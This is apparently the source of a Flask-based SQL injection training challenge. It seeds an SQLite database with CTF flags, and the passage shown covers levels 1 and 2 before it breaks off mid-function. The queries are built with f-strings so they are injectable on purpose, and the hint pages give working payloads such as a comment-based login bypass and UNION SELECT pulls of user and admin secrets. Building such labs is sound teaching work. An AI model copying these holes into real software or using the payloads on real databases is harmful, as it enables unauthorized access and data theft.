#!/usr/bin/env python3
"""
Complete Progressive SQL Injection Challenge - All 10 Levels
Single file implementation with increasing complexity
Professional-grade cybersecurity training system
"""

from flask import Flask, request, render_template_string, session, make_response
import sqlite3
import hashlib
import os
import time
import re
import base64
import json
from datetime import datetime
import random
import string

app = Flask(__name__)
app.secret_key = 'progressive_sqli_challenge_master_2025'

class ProgressiveSQLIChallenge:
    def __init__(self):
        self.init_comprehensive_db()
        self.waf_rules = [
            r'\bunion\b', r'\bselect\b', r'\bfrom\b', r'\bwhere\b',
            r'--', r'/\*', r'\*/', r'\bor\b', r'\band\b'
        ]
        self.attack_log = []
        
    def init_comprehensive_db(self):
        """Initialize complete database for all 10 levels"""
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        db_dir = os.path.join(base_dir, 'database')
        os.makedirs(db_dir, exist_ok=True)
        self.db_path = os.path.join(db_dir, 'progressive_sqli_complete.db')
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Users table with all level flags
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                email TEXT,
                level_flags TEXT,
                session_token TEXT,
                is_active INTEGER DEFAULT 1,
                profile_data TEXT,
                last_login TEXT,
                failed_attempts INTEGER DEFAULT 0
            )
        """)
        
        # Products table for union attacks
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                description TEXT,
                price REAL,
                category TEXT,
                hidden_data TEXT,
                stock_quantity INTEGER,
                supplier_info TEXT
            )
        """)
        
        # Admin panel with master secrets
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS admin_panel (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_username TEXT,
                admin_password TEXT,
                secret_key TEXT,
                master_flag TEXT,
                api_keys TEXT,
                system_config TEXT
            )
        """)
        
        # Transactions for complex queries
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                description TEXT,
                transaction_flag TEXT,
                transaction_date TEXT,
                status TEXT,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        """)
        
        # User sessions table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                session_token TEXT,
                created_at TEXT,
                last_activity TEXT,
                ip_address TEXT,
                user_agent TEXT
            )
        """)
        
        # Comments for second-order injection
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS user_comments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                comment_text TEXT,
                posted_at TEXT,
                hidden_flag TEXT,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        """)
        
        # API cache for advanced levels
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS api_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                query_hash TEXT,
                api_result TEXT,
                cached_at TEXT
            )
        """)
        
        self.populate_all_levels_data(cursor)
        conn.commit()
        conn.close()
    
    def populate_all_levels_data(self, cursor):
        """Populate database with data for all 10 levels"""
        
        # Progressive user accounts for each level
        users_data = [
            # Level 1: Basic bypass
            ('guest', hashlib.md5('guest'.encode()).hexdigest(), 'user', 'guest@demo.com', 
             'CTF{level_1_basic_bypass_achieved}', None, 1, '{"bio": "Guest user"}', None, 0),
             
            # Level 2: Union injection
            ('user1', hashlib.md5('password'.encode()).hexdigest(), 'user', 'user1@demo.com',
             'CTF{level_2_union_injection_mastered}', None, 1, '{"department": "IT"}', None, 0),
             
            # Level 3: Blind injection
            ('blind_user', hashlib.md5('secret123'.encode()).hexdigest(), 'user', 'blind@demo.com',
             'CTF{level_3_blind_injection_discovered}', None, 1, '{"access": "restricted"}', None, 0),
             
            # Level 4: Time-based
            ('time_user', hashlib.md5('timer456'.encode()).hexdigest(), 'user', 'time@demo.com',
             'CTF{level_4_time_based_extraction_complete}', None, 1, '{"timing": true}', None, 0),
             
            # Level 5: Error-based
            ('error_user', hashlib.md5('error789'.encode()).hexdigest(), 'user', 'error@demo.com',
             'CTF{level_5_error_based_enumeration_success}', None, 1, '{"errors": "logged"}', None, 0),
             
            # Level 6: WAF evasion
            ('waf_user', hashlib.md5('bypass321'.encode()).hexdigest(), 'user', 'waf@demo.com',
             'CTF{level_6_waf_evasion_techniques_mastered}', None, 1, '{"protected": true}', None, 0),
             
            # Level 7: Second-order
            ('stored_user', hashlib.md5('stored654'.encode()).hexdigest(), 'user', 'stored@demo.com',
             'CTF{level_7_second_order_injection_achieved}', None, 1, '{"storage": "premium"}', None, 0),
             
            # Level 8: Advanced obfuscation
            ('obfusc_user', hashlib.md5('obfusc987'.encode()).hexdigest(), 'user', 'obfusc@demo.com',
             'CTF{level_8_advanced_obfuscation_bypassed}', None, 1, '{"obfuscated": "classified"}', None, 0),
             
            # Level 9: Privilege escalation
            ('escalate_user', hashlib.md5('escalate111'.encode()).hexdigest(), 'user', 'escalate@demo.com',
             'CTF{level_9_privilege_escalation_completed}', None, 1, '{"target": "admin"}', None, 0),
             
            # Level 10: Full compromise
            ('admin', hashlib.md5('admin_master_2025'.encode()).hexdigest(), 'admin', 'admin@company.com',
             'CTF{level_10_full_compromise_apt_simulation}', None, 1, '{"supreme": true}', None, 0)
        ]
        
        for user in users_data:
            cursor.execute("""
                INSERT OR IGNORE INTO users 
                (username, password, role, email, level_flags, session_token, is_active, profile_data, last_login, failed_attempts) 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, user)
        
        # Products with hidden flags
        products_data = [
            ('Laptop Pro Max', 'Ultimate laptop', 2499.99, 'Electronics', 
             'CTF{hidden_product_flag_level_2}', 50, 'TechCorp Ltd'),
            ('Security Handbook', 'Complete guide', 89.99, 'Books', 
             'CTF{union_select_mastery_achieved}', 200, 'EduPress'),
            ('Penetration Kit', 'Testing toolkit', 1999.99, 'Security', 
             'CTF{product_enumeration_complete}', 10, 'SecTools Inc'),
        ]
        
        for product in products_data:
            cursor.execute("""
                INSERT OR IGNORE INTO products 
                (name, description, price, category, hidden_data, stock_quantity, supplier_info) 
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, product)
        
        # Admin panel with ultimate secrets
        cursor.execute("""
            INSERT OR IGNORE INTO admin_panel 
            (admin_username, admin_password, secret_key, master_flag, api_keys, system_config) 
            VALUES (?, ?, ?, ?, ?, ?)
        """, ('superadmin', 'ultimate_password_2025', 'SECRET_MASTER_KEY_XYZ789', 
              'CTF{ultimate_admin_access_achieved}', 
              'API_KEY_1234567890,API_SECRET_ABCDEFGHIJ',
              '{"maintenance": false, "debug": true}'))
        
        # Transactions with flags
        transactions_data = [
            (1, 5000.00, 'Initial deposit', 'CTF{financial_data_extracted}', '2025-01-15', 'completed'),
            (9, 50000.00, 'Escalation bonus', 'CTF{escalation_financial_proof}', '2025-06-01', 'pending'),
            (10, 999999.99, 'Admin compensation', 'CTF{admin_financial_access}', '2025-09-01', 'completed'),
        ]
        
        for trans in transactions_data:
            cursor.execute("""
                INSERT OR IGNORE INTO transactions 
                (user_id, amount, description, transaction_flag, transaction_date, status) 
                VALUES (?, ?, ?, ?, ?, ?)
            """, trans)
        
        # Comments for second-order injection
        comments_data = [
            (7, 'This is a test comment', datetime.now().isoformat(), 'CTF{level_7_second_order_injection_achieved}'),
            (1, 'Welcome to the system', datetime.now().isoformat(), ''),
        ]
        
        for comment in comments_data:
            cursor.execute("""
                INSERT OR IGNORE INTO user_comments 
                (user_id, comment_text, posted_at, hidden_flag) 
                VALUES (?, ?, ?, ?)
            """, comment)

# Initialize the challenge system
challenge = ProgressiveSQLIChallenge()

@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Progressive SQL Injection Mastery - 10 Levels</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
            .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-bottom: 20px; }
            .header { text-align: center; color: #2c3e50; margin-bottom: 30px; }
            .level-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin: 30px 0; }
            .level-card { 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
                color: white; padding: 20px; border-radius: 10px; text-align: center; 
                cursor: pointer; transition: all 0.3s ease;
                text-decoration: none; display: block; position: relative; overflow: hidden;
            }
            .level-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(0,0,0,0.3); color: white; text-decoration: none; }
            .level-card::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: left 0.5s; }
            .level-card:hover::before { left: 100%; }
            .difficulty { padding: 5px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; margin: 8px 0; display: inline-block; }
            .beginner { background: #28a745; }
            .intermediate { background: #ffc107; color: black; }
            .advanced { background: #dc3545; }
            .expert { background: #6f42c1; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 15px; border-radius: 8px; margin: 20px 0; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 30px 0; }
            .stat-card { background: #f8f9fa; padding: 20px; border-radius: 10px; text-align: center; border: 1px solid #dee2e6; }
            .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; margin-bottom: 10px; }
            .feature-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin: 30px 0; }
            .feature-box { background: #f8f9fa; padding: 25px; border-radius: 10px; border-left: 5px solid #667eea; }
            h1 { font-size: 2.5em; margin-bottom: 10px; }
            h2 { color: #34495e; border-bottom: 3px solid #667eea; padding-bottom: 10px; margin-top: 30px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 Progressive SQL Injection Mastery</h1>
                <p style="font-size: 1.3em; color: #666; margin-bottom: 0;">Master SQL injection through 10 expertly crafted levels</p>
                <p style="color: #888;">From basic authentication bypass to advanced APT simulation</p>
            </div>
            
            <div class="warning">
                ⚠️ <strong>Educational Cybersecurity Training:</strong> This challenge contains intentional vulnerabilities designed for learning. 
                All techniques should only be used in authorized testing environments with proper permission.
            </div>

            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">10</div>
                    <div><strong>Progressive Levels</strong><br>Increasing Complexity</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">25+</div>
                    <div><strong>Unique Flags</strong><br>Hidden Achievements</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">9</div>
                    <div><strong>Attack Techniques</strong><br>Professional Methods</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">50+</div>
                    <div><strong>Learning Hours</strong><br>Comprehensive Training</div>
                </div>
            </div>

            <h2>🎮 Progressive Challenge Levels</h2>
            <div class="level-grid">
                <a href="/level/1" class="level-card">
                    <h3>Level 1</h3>
                    <div class="difficulty beginner">BEGINNER</div>
                    <p><strong>Authentication Bypass</strong></p>
                    <small>SQL Comment Injection</small>
                </a>
                <a href="/level/2" class="level-card">
                    <h3>Level 2</h3>
                    <div class="difficulty beginner">BEGINNER</div>
                    <p><strong>Union Injection</strong></p>
                    <small>Cross-Table Data Extraction</small>
                </a>
                <a href="/level/3" class="level-card">
                    <h3>Level 3</h3>
                    <div class="difficulty intermediate">INTERMEDIATE</div>
                    <p><strong>Blind Injection</strong></p>
                    <small>Boolean-Based Extraction</small>
                </a>
                <a href="/level/4" class="level-card">
                    <h3>Level 4</h3>
                    <div class="difficulty intermediate">INTERMEDIATE</div>
                    <p><strong>Time-Based Attacks</strong></p>
                    <small>Response Timing Analysis</small>
                </a>
                <a href="/level/5" class="level-card">
                    <h3>Level 5</h3>
                    <div class="difficulty intermediate">INTERMEDIATE</div>
                    <p><strong>Error-Based Extraction</strong></p>
                    <small>Information Through Errors</small>
                </a>
                <a href="/level/6" class="level-card">
                    <h3>Level 6</h3>
                    <div class="difficulty advanced">ADVANCED</div>
                    <p><strong>WAF Evasion</strong></p>
                    <small>Firewall Bypass Techniques</small>
                </a>
                <a href="/level/7" class="level-card">
                    <h3>Level 7</h3>
                    <div class="difficulty advanced">ADVANCED</div>
                    <p><strong>Second-Order Injection</strong></p>
                    <small>Stored Payload Execution</small>
                </a>
                <a href="/level/8" class="level-card">
                    <h3>Level 8</h3>
                    <div class="difficulty advanced">ADVANCED</div>
                    <p><strong>Advanced Obfuscation</strong></p>
                    <small>Sophisticated Encoding</small>
                </a>
                <a href="/level/9" class="level-card">
                    <h3>Level 9</h3>
                    <div class="difficulty expert">EXPERT</div>
                    <p><strong>Privilege Escalation</strong></p>
                    <small>Multi-Stage Attack Chain</small>
                </a>
                <a href="/level/10" class="level-card">
                    <h3>Level 10</h3>
                    <div class="difficulty expert">EXPERT</div>
                    <p><strong>Full APT Simulation</strong></p>
                    <small>Complete Compromise</small>
                </a>
            </div>

            <div class="feature-grid">
                <div class="feature-box">
                    <h3>🎯 Professional Skills Developed</h3>
                    <ul>
                        <li><strong>Manual Testing:</strong> Hand-crafted injection techniques</li>
                        <li><strong>Automated Discovery:</strong> Tool-assisted vulnerability detection</li>
                        <li><strong>Evasion Mastery:</strong> WAF and filter bypass methods</li>
                        <li><strong>Attack Chaining:</strong> Multi-stage compromise scenarios</li>
                        <li><strong>Secure Development:</strong> Prevention and remediation</li>
                    </ul>
                </div>
                
                <div class="feature-box">
                    <h3>🏆 Career Applications</h3>
                    <ul>
                        <li><strong>Penetration Tester:</strong> Comprehensive web app testing</li>
                        <li><strong>Security Consultant:</strong> Vulnerability assessment</li>
                        <li><strong>Application Security:</strong> Secure code review</li>
                        <li><strong>Red Team Operator:</strong> Advanced attack simulation</li>
                        <li><strong>Bug Bounty Hunter:</strong> Professional vulnerability research</li>
                    </ul>
                </div>
            </div>

            <div style="text-align: center; margin-top: 40px; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; color: white;">
                <h3>🚀 Start Your SQL Injection Mastery Journey</h3>
                <p style="margin: 15px 0;">Begin with Level 1 and progress through increasingly complex challenges</p>
                <a href="/level/1" style="background: white; color: #667eea; padding: 15px 30px; border-radius: 25px; text-decoration: none; font-weight: bold; display: inline-block; margin: 10px;">Begin Challenge →</a>
            </div>
        </div>
    </body>
    </html>
    """)

# Level 1: Basic Authentication Bypass
@app.route('/level/1')
def level1():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 1: Basic Authentication Bypass</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #28a745, #20c997); color: white; padding: 25px; border-radius: 10px; margin-bottom: 25px; text-align: center; }
            .difficulty { background: #28a745; color: white; padding: 8px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin: 10px 0; }
            .objective-box { background: #e3f2fd; border-left: 5px solid #2196f3; padding: 20px; margin: 20px 0; border-radius: 5px; }
            .form-box { background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 25px 0; border: 1px solid #dee2e6; }
            .hint-box { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .code { background: #f1f3f4; border: 1px solid #e1e4e8; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; margin: 15px 0; overflow-x: auto; }
            input[type="text"], input[type="password"] { width: 300px; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; }
            button { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
            button:hover { background: #0056b3; }
            .nav-buttons { text-align: center; margin-top: 30px; }
            .nav-buttons a { display: inline-block; margin: 0 10px; padding: 12px 24px; background: #6c757d; color: white; text-decoration: none; border-radius: 8px; transition: background 0.3s; }
            .nav-buttons a:hover { background: #545b62; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 1: Basic Authentication Bypass</h1>
                <span class="difficulty">BEGINNER</span>
                <p style="margin: 15px 0 0 0;">Master the foundation of SQL injection with comment-based authentication bypass</p>
            </div>

            <div class="objective-box">
                <h3>📖 Learning Objective</h3>
                <p>Understand how SQL comment injection can be used to bypass authentication systems. This fundamental technique forms the basis for all advanced SQL injection attacks.</p>
                <p><strong>Expected Discovery:</strong> <code>CTF{level_1_basic_bypass_achieved}</code></p>
            </div>

            <div class="form-box">
                <h3>🎯 Target Authentication System</h3>
                <p>Attempt to login to the system below. The backend uses a vulnerable SQL query to verify credentials.</p>
                
                <form method="POST" action="/level/1/login" style="text-align: center;">
                    <div style="margin: 20px 0;">
                        <label style="display: block; font-weight: bold; margin-bottom: 5px;">👤 Username:</label>
                        <input type="text" name="username" placeholder="Try: guest' --" style="text-align: center;">
                    </div>
                    <div style="margin: 20px 0;">
                        <label style="display: block; font-weight: bold; margin-bottom: 5px;">🔒 Password:</label>
                        <input type="password" name="password" placeholder="Enter any password" style="text-align: center;">
                    </div>
                    <button type="submit">🚀 Attempt Login</button>
                </form>
            </div>

            <div class="hint-box">
                <h3>💡 Technical Learning Hints</h3>
                <p><strong>Query Structure Analysis:</strong></p>
                <div class="code">SELECT * FROM users WHERE username='[YOUR_INPUT]' AND password='[HASH]'</div>
                
                <p><strong>SQL Comment Injection Technique:</strong></p>
                <ul>
                    <li><strong>-- (double dash):</strong> SQL line comment - ignores everything after</li>
                    <li><strong># (hash):</strong> MySQL comment syntax</li>
                    <li><strong>/* */:</strong> Multi-line comment blocks</li>
                </ul>
                
                <p><strong>Attack Vector:</strong></p>
                <div class="code">Username: guest' --<br>Result: SELECT * FROM users WHERE username='guest' --' AND password='...'</div>
                <p>The password check is completely ignored due to the comment!</p>
                
                <div style="background: #e8f5e8; padding: 15px; border-radius: 5px; margin-top: 15px;">
                    <strong>🎯 Success Indicators:</strong>
                    <ul style="margin: 10px 0;">
                        <li>Login succeeds without correct password</li>
                        <li>Flag appears in success message</li>
                        <li>Understanding of comment-based bypass technique</li>
                    </ul>
                </div>
            </div>

            <div class="nav-buttons">
                <a href="/">🏠 Home</a>
                <a href="/level/2">➡️ Next: Level 2</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/1/login', methods=['POST'])
def level1_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Log attack attempt
    challenge.attack_log.append({
        'level': 1,
        'timestamp': datetime.now().isoformat(),
        'payload': username,
        'ip': request.remote_addr
    })
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Level 1: Intentionally vulnerable query
    query = f"SELECT id, username, role, level_flags FROM users WHERE username='{username}' AND password='{hashlib.md5(password.encode()).hexdigest()}'"
    
    try:
        result = cursor.execute(query).fetchone()
        conn.close()
        
        if result:
            return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Level 1 Success!</title>
                <style>
                    body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: linear-gradient(135deg, #28a745, #20c997); min-height: 100vh; }
                    .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
                    .success-header { color: #28a745; margin-bottom: 30px; }
                    .flag-box { background: linear-gradient(135deg, #d4edda, #c3e6cb); border: 3px solid #28a745; color: #155724; padding: 25px; border-radius: 15px; margin: 25px 0; font-size: 18px; font-weight: bold; }
                    .achievement-box { background: #fff3cd; border: 2px solid #ffeaa7; color: #746628; padding: 25px; border-radius: 10px; margin: 25px 0; text-align: left; }
                    .technical-box { background: #f8f9fa; border: 1px solid #dee2e6; padding: 20px; border-radius: 8px; margin: 20px 0; text-align: left; }
                    button { background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin: 10px; transition: background 0.3s; }
                    button:hover { background: #1e7e34; }
                    .home-btn { background: #6c757d; }
                    .home-btn:hover { background: #545b62; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="success-header">
                        <h1>🎉 Level 1 Complete!</h1>
                        <h2>Authentication Bypass Successful</h2>
                    </div>

                    <div class="flag-box">
                        🚩 <strong>FLAG CAPTURED:</strong><br>
                        {{ flag }}
                    </div>

                    <div class="achievement-box">
                        <h3>🏆 Achievement Unlocked: SQL Injection Novice</h3>
                        <p><strong>What you accomplished:</strong></p>
                        <ul>
                            <li>✅ Mastered SQL comment injection using <code>--</code></li>
                            <li>✅ Successfully bypassed authentication without password</li>
                            <li>✅ Understood vulnerable query structure manipulation</li>
                            <li>✅ Gained unauthorized access to user account: <strong>{{ username }}</strong></li>
                        </ul>
                    </div>

                    <div class="technical-box">
                        <h3>🔬 Technical Analysis</h3>
                        <p><strong>Your Injection Payload:</strong> <code>{{ payload }}</code></p>
                        <p><strong>Attack Mechanism:</strong> The SQL comment <code>--</code> caused the database to ignore everything after it, including the password verification clause.</p>
                        <p><strong>Vulnerable Query Result:</strong></p>
                        <code style="background: #f1f3f4; padding: 10px; display: block; margin: 10px 0; border-radius: 4px;">
                            SELECT * FROM users WHERE username='{{ username.split("'")[0] }}' -- [password check ignored]
                        </code>
                    </div>

                    <div style="margin-top: 30px;">
                        <button onclick="location.href='/level/2'">🚀 Continue to Level 2: Union Injection</button>
                        <button class="home-btn" onclick="location.href='/'">🏠 Back to Home</button>
                    </div>
                    
                    <div style="margin-top: 20px; color: #666; font-size: 14px;">
                        <p>🎯 <strong>Next Challenge Preview:</strong> Learn Union-based SQL injection to extract data from multiple database tables simultaneously.</p>
                    </div>
                </div>
            </body>
            </html>
            """, flag=result[3], username=result[1], payload=username)
        else:
            return render_template_string("""
            <h1>❌ Level 1 Authentication Failed</h1>
            <div style="max-width: 600px; margin: 50px auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1);">
                <p><strong>SQL Query Executed:</strong></p>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; margin: 15px 0; word-break: break-all;">{{ query }}</div>
                
                <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0;">
                    <h3>💡 Debugging Hints:</h3>
                    <ul>
                        <li>Try using <code>' --</code> after a valid username to comment out password check</li>
                        <li>Example payload: <code>guest' --</code></li>
                        <li>The comment will make the query: <code>WHERE username='guest' --[rest ignored]</code></li>
                    </ul>
                </div>
                
                <div style="text-align: center; margin-top: 25px;">
                    <a href="/level/1" style="background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px; margin: 5px;">🔄 Try Again</a>
                    <a href="/" style="background: #6c757d; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px; margin: 5px;">🏠 Home</a>
                </div>
            </div>
            """, query=query)
    except Exception as e:
        conn.close()
        return render_template_string("""
        <h1>💥 SQL Error (Debugging Opportunity!)</h1>
        <div style="max-width: 600px; margin: 50px auto; padding: 30px; background: white; border-radius: 10px;">
            <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 15px; border-radius: 5px; margin: 15px 0;">
                <strong>Database Error:</strong> {{ error }}
            </div>
            <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; margin: 15px 0; word-break: break-all;">
                <strong>Query:</strong> {{ query }}
            </div>
            <div style="background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 5px; margin: 15px 0;">
                <strong>Learning Opportunity:</strong> SQL errors often reveal query structure. Use this information to understand how your input affects the database query and craft better injection payloads.
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <a href="/level/1" style="background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px;">🔄 Try Again</a>
            </div>
        </div>
        """, error=str(e), query=query)
# Level 2: Union-Based SQL Injection
@app.route('/level/2')
def level2():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 2: Union-Based SQL Injection</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #17a2b8, #138496); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #17a2b8; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"] { width: 500px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .hint-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .code { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
            .technique-box { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 15px; border-radius: 8px; margin: 15px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 2: Union-Based SQL Injection</h1>
                <span class="difficulty">BEGINNER</span>
                <p>Master UNION SELECT to extract data from multiple database tables</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>Use UNION-based SQL injection to extract sensitive data from the users table through the product search functionality. This technique allows you to combine results from different tables in a single query.</p>

            <h3>🎯 Target Search System</h3>
            <div class="form-box">
                <form method="GET" action="/level/2/search">
                    <div>
                        <label><strong>Product Search:</strong></label><br>
                        <input type="text" name="q" placeholder="Try: laptop' UNION SELECT username,password,role,level_flags FROM users--">
                    </div>
                    <button type="submit">🔍 Search Products</button>
                </form>
            </div>

            <h3>💡 Advanced Learning Hints</h3>
            <div class="hint-box">
                <p><strong>Table Structure Analysis:</strong></p>
                <div class="code">Products table: name, description, price, category (4 columns)
Users table: username, password, role, level_flags (and more)</div>
                
                <p><strong>UNION SELECT Requirements:</strong></p>
                <ul>
                    <li>Both SELECT statements must have the same number of columns</li>
                    <li>Corresponding columns must have compatible data types</li>
                    <li>Use NULL or dummy values to fill missing columns</li>
                </ul>
            </div>

            <div class="technique-box">
                <p><strong>Injection Payload Examples:</strong></p>
                <div class="code">
                    Basic UNION: ' UNION SELECT username,password,role,level_flags FROM users--<br>
                    With NULL padding: ' UNION SELECT username,NULL,NULL,level_flags FROM users--<br>
                    Multiple tables: ' UNION SELECT admin_username,admin_password,secret_key,master_flag FROM admin_panel--
                </div>
            </div>

            <h3>🎯 Expected Discoveries</h3>
            <ul>
                <li>Extract usernames and hashed passwords from users table</li>
                <li>Discover the flag: <code>CTF{level_2_union_injection_mastered}</code></li>
                <li>Understand how UNION SELECT works in practice</li>
            </ul>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/1" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/3" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/2/search')
def level2_search():
    query_term = request.args.get('q', '')
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Level 2: Union injection vulnerability
    search_query = f"SELECT name, description, price, category FROM products WHERE name LIKE '%{query_term}%'"
    
    try:
        results = cursor.execute(search_query).fetchall()
        conn.close()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Level 2 Search Results</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
                th {{ background-color: #f2f2f2; font-weight: bold; }}
                .query-display {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; font-family: monospace; }}
                .flag-found {{ background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; }}
                .success-message {{ background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; }}
            </style>
        </head>
        <body>
            <h1>🔍 Level 2 Search Results</h1>
            <div class="query-display">
                <strong>SQL Query Executed:</strong><br>
                {search_query}
            </div>
            
            <table>
                <tr><th>Name/Username</th><th>Description/Password</th><th>Price/Role</th><th>Category/Flags</th></tr>
        """
        
        flag_found = False
        user_data_found = False
        
        for result in results:
            html += f"<tr><td>{result[0]}</td><td>{result[1]}</td><td>{result[2]}</td><td>{result[3]}</td></tr>"
            
            # Check if this row contains user data (indicates successful UNION injection)
            if any(keyword in str(result).lower() for keyword in ['user', 'admin', 'guest', '@']):
                user_data_found = True
            
            # Check for flags
            if 'CTF{level_2_union_injection_mastered}' in str(result):
